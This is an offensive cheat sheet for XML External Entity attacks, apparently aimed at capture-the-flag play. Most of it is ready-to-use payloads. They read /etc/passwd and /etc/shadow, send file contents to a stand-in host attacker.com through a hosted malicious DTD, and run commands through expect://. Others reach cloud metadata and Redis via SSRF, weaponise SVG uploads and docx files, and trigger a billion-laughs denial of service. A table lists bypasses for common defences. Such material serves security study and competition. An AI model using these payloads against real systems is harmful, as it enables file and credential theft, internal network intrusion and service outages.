# XXE — XML External Entity

Any endpoint that parses XML with external entities enabled lets you read files, perform SSRF, and sometimes RCE. Target: SOAP services, SVG upload, OOXML (docx/xlsx), RSS feeds, XML APIs, configuration importers.

## Identify

- Request body is `<?xml ...>` or `Content-Type: application/xml`.
- SVG upload accepted (`<svg xmlns="http://www.w3.org/2000/svg">` is XML).
- `.docx`, `.xlsx`, `.pptx` ingestion (they're ZIPs of XML).
- Error message mentions `DOCTYPE`, `ENTITY`, `libxml`, `SAX`, `DOM`.

## Classic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

If the response reflects element content, the file content shows up where `&xxe;` was.

## Blind XXE (no reflection) via out-of-band

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root/>
```

Attacker's `evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?x=%file;'>">
%all;
%send;
```

Fire with a listener on attacker.com — you'll see the file content in the GET parameter. For non-text files (binary):
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
```

## PHP wrapper tricks (same as LFI)

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY xxe SYSTEM "data://text/plain,hello">
<!ENTITY xxe SYSTEM "expect://id">            <!-- PHP expect ext -->
```

## SSRF via XXE

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20foo%20bar">
```

## XXE via SVG upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="16">&xxe;</text>
</svg>
```

Save as `exploit.svg`, upload where it's parsed server-side (profile avatar, thumbnail generator).

## XXE in Office documents

```bash
# Create malicious docx
cp clean.docx evil.docx
unzip -o evil.docx -d evil/
# Edit evil/word/document.xml — add DOCTYPE + ENTITY to the opening
# Zip back up
cd evil && zip -r ../evil.docx . && cd ..
```

## XInclude (when you can inject into but not around XML)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Works even when you only control a sub-element, not the full document / DOCTYPE.

## Billion laughs / DoS

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

Don't fire in competition unless the challenge explicitly asks — a DoS of a shared scoring box annoys everyone.

## Mitigations you'll see (and bypasses)

| Mitigation | Bypass |
| --- | --- |
| DOCTYPE blocked | XInclude (no DOCTYPE needed) |
| External entities disabled | Parameter entities with blind OOB |
| `libxml2` with `LIBXML_NOENT` not set but DTD blocked | SVG with inline entities |
| Only `.docx` extension allowed | Inject into `word/document.xml` of a legit docx |

## Offline reference

```bash
ls /opt/tools/PayloadsAllTheThings/XXE\ Injection/
rg -n 'xxe|external entity' /opt/tools/HackTricks/
```

## Tips
- Always try blind-OOB first on CTFs — most apps don't echo the parsed element back directly.
- An attacker-hosted DTD is required for the two-step `%file;%dtd;` chain. Spin up a Python HTTP server on your box, port it through the VPN.
- SVG files survive many "upload only images" filters because they ARE images from the server's `file`-command perspective.
- `.docx`/`.xlsx`/`.pptx` are zip files — unzip, inject XXE into `word/document.xml` or `xl/workbook.xml`, rezip.
- The challenge may deliberately disable `file://` — try `http://`, `php://`, `expect://`, `data://`.
